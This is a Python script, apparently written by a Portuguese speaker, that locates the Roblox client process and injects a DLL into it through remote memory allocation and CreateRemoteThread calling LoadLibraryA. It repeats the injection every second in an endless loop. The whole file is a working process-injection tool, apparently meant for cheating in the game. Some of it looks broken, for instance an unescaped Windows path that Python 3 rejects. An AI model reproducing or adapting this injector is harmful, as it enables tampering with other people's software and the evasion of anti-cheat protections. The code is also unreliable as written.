import ctypes
import time
import psutil

def get_process_id(process_name):
    for process in psutil.process_iter(['pid', 'name']):
        if process.info['name'].lower() == process_name.lower():
            return process.info['pid']
    return None

def inject_dll(process_id, dll_path):
    PROCESS_ALL_ACCESS = 0x1F0FFF
    kernel32 = ctypes.windll.kernel32
    
    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, process_id)
    if not h_process:
        print("Falha ao abrir o processo!")
        return
    
    dll_path_bytes = dll_path.encode('utf-8')
    alloc_address = kernel32.VirtualAllocEx(h_process, 0, len(dll_path_bytes) + 1, 0x3000, 0x40)
    ctypes.windll.kernel32.WriteProcessMemory(h_process, alloc_address, dll_path_bytes, len(dll_path_bytes) + 1, None)
    
    load_library = kernel32.GetProcAddress(kernel32.GetModuleHandleW("kernel32.dll"), b"LoadLibraryA")
    remote_thread = kernel32.CreateRemoteThread(h_process, None, 0, load_library, alloc_address, 0, None)
    if remote_thread:
        kernel32.CloseHandle(remote_thread)
    kernel32.CloseHandle(h_process)

def main():
    process_name = "RobloxPlayerBeta.exe"  # Nome do processo alvo
    dll_path = "C:\Users\Fischer\source\repos\ClassLibrary4\ClassLibrary4\bin\x64\Release\net8.0\ClassLibrary4.dll"  # Caminho da DLL
    
    while True:
        process_id = get_process_id(process_name)
        if process_id:
            inject_dll(process_id, dll_path)
            print(f"DLL injetada no processo {process_name}")
        else:
            print("Processo não encontrado!")
        time.sleep(1)  # Intervalo de spam (1 segundo)

if __name__ == "__main__":
    main()
